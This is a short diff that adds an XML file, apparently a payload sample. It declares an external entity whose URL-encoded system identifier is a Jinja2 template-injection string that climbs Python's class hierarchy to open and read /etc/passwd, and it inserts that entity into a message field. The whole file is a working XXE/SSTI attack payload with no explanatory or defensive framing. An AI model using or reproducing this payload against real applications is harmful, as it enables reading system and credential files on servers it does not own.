@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "%7b%7b+%27%27.__class__.__mro__%5B2%5D.__subclasses__%28%29%5B40%5D%28%27%2Fetc%2Fpasswd%27%29.read%28%29+%7D%7D">]>                                                             
+<message>
+<id></id>
+<message>&xxe;</message>
+<title>xml</title>
+</message>
